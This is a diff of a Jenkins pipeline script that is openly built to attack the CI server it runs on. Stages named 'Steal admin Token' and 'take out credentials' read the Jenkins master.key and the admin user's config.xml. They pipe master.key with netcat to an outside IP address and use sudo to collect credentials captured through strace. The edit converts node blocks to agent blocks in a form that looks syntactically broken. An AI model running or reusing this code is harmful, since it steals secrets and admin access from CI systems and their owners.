@@ -22,7 +22,8 @@ pipeline {
     } 
 	
 	stage('Steal admin Token') {
-		node ('master') {
+		agent {  
+			label 'master' 
 			def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
 			println fileContents
 			def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
@@ -42,20 +43,20 @@ pipeline {
 			println str
 
 			sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
-		} // end node
+		} // end agent
 	}
 	stage('take out credentials') {
 	  //
 	  // back to the ubuntu node
 	  //
-	  node ('ubuntu') {
-		  label 'ubuntu'
-		  sh 'sudo kill $(pidof strace)'
-		  sh 'sudo cat /home/ubuntu/out.2'
-	  }
+		agent { 
+			label 'ubuntu' 
+			sh 'sudo kill $(pidof strace)'
+			sh 'sudo cat /home/ubuntu/out.2'
+	  } // end agent
 	}
-  }	
-}
+  } // end stages	
+} // end pipeline
 
 
 
